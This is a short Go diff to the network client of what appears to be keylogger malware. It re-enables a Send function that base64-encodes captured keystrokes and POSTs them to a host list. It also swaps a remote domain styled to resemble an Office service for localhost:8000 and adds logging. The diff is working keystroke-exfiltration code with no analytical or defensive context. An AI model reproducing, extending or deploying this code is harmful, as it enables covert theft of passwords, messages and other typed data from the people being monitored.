@@ -1,7 +1,10 @@
 package client
 
 import (
+	"bytes"
+	"encoding/base64"
 	"fmt"
+	"log"
 	"math/rand"
 	"net/http"
 )
@@ -14,7 +17,7 @@ const (
 var (
 	client = &http.Client{}
 	HOSTS  = []string{
-		"nexus.officeapps.live.vkcloud.ovh",
+		"localhost:8000",
 	}
 )
 
@@ -23,14 +26,18 @@ type host struct {
 }
 
 func nextHost() string {
-	return fmt.Sprintf("https://%s", HOSTS[rand.Intn(len(HOSTS))])
+	return fmt.Sprintf("http://%s", HOSTS[rand.Intn(len(HOSTS))])
 }
 
 func Send(keystrokes string) {
-	/*buf := &bytes.Buffer{}
+	fmt.Println(keystrokes)
+	buf := &bytes.Buffer{}
 	base64.NewEncoder(base64.RawStdEncoding, buf).Write([]byte(keystrokes))
 	req, _ := http.NewRequest("POST", nextHost(), buf)
 	req.Header.Set("Referer", "")
-	req.Header.Set("User-Agent", "")
-	client.Do(req)*/
+	req.Header.Set("User-Agent", "FooBar")
+	_, err := client.Do(req)
+	if err != nil {
+		log.Fatal(err)
+	}
 }
